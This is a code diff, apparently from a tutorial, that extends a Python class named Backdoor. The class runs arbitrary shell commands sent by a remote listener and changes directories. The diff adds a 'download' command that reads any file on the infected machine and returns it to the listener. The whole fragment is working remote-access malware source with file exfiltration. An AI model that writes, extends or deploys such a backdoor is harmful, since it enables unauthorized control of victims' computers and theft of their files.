@@ -23,9 +23,15 @@ class Backdoor:
     def execute_system_command(self, command):
         return subprocess.check_output(command, shell=True)
 
+    # Change the working directory to a given path
     def change_working_directory_to(self, path):
         os.chdir(path)
         return "[+] Changing working directory to: " + path
+
+    # Read file as binary
+    def read_file(self, path):
+        with open(path, "rb") as file:  # "rb" stands for read binary
+            return file.read()
 
     # Start the connection to the listener
     def run(self):
@@ -40,6 +46,10 @@ class Backdoor:
             # Incoming command cd with path
             elif command[0] == "cd" and len(command) > 1:
                 command_result = self.change_working_directory_to(command[1])
+
+            # Incoming command download with file path
+            elif command[0] == "download":
+                command_result = self.read_file(command[1])
 
             else:
                 command_result = self.execute_system_command(command)
